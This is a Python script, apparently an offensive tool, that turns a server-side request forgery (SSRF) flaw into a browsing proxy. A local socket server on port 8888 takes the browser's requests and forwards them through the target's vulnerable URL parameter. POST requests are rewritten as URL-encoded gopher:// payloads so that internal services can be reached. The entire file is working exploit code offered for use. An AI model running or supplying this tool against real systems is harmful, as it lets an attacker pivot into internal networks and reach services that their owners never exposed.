import socket
import threading
import urllib.parse
import requests
import argparse
import sys

def handle_client(client_socket):
    request_data = client_socket.recv(4096)
    request_lines = request_data.decode().split('\n')
    request_line = request_lines[0].strip()

    # 提取请求行中的URL
    url = request_line.split(' ')[1]
    print(url)

    if "POST" in request_line:
        # 提取请求体中的数据
        content_length = 0
        for line in request_lines:
            if "Content-Length" in line:
                content_length = int(line.split(":")[1].strip())
                break

        request_body = request_data.decode().split('\r\n\r\n')[1]
        while len(request_body) < content_length:
            request_body += client_socket.recv(4096).decode()

        # 构建Gopher协议数据,ssrf点需要支持gopher协议才能发送POST请求
        gopher_data = "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n{}".format(url, args.host, content_length, request_body)
        gopher_data_encoded = urllib.parse.quote(gopher_data, safe='')

        target_url = args.url + 'gopher://'+ args.host +":80/_" + gopher_data_encoded

        try:
            response = requests.get(target_url)
            print(target_url)
            # 将回显结果发送给浏览器
            client_socket.sendall(response.text.encode())

        except requests.exceptions.RequestException as e:
            # 处理请求异常
            error_response = 'HTTP/1.1 500 Internal Server Error\r\n\r\n' + str(e)
            client_socket.sendall(error_response.encode())

    else:
        target_url = args.url + urllib.parse.quote(url, safe='')
        try:
            response = requests.get(target_url)
            print(target_url)
            client_socket.sendall(response.text.encode())

        except requests.exceptions.RequestException as e:
            # 处理请求异常
            error_response = 'HTTP/1.1 500 Internal Server Error\r\n\r\n' + str(e)
            client_socket.sendall(error_response.encode())

    client_socket.close()

def start_proxy_server():
    proxy_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    proxy_server.bind((proxy_host, proxy_port))
    proxy_server.listen(5)

    print('Proxy server is running on {}:{}'.format(proxy_host, proxy_port))

    while True:
        client_socket, addr = proxy_server.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()

if __name__ == '__main__':
    proxy_host = '127.0.0.1'
    proxy_port = 8888
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', type=str, help='Target URL')
    args = parser.parse_args()

    if not args.url:
        print("Please provide the target ssrf URL using the -u or --url option.")
        sys.exit(1)

    # 提取目标主机
    parsed_url = urllib.parse.urlparse(args.url)
    args.host = parsed_url.netloc
    start_proxy_server()
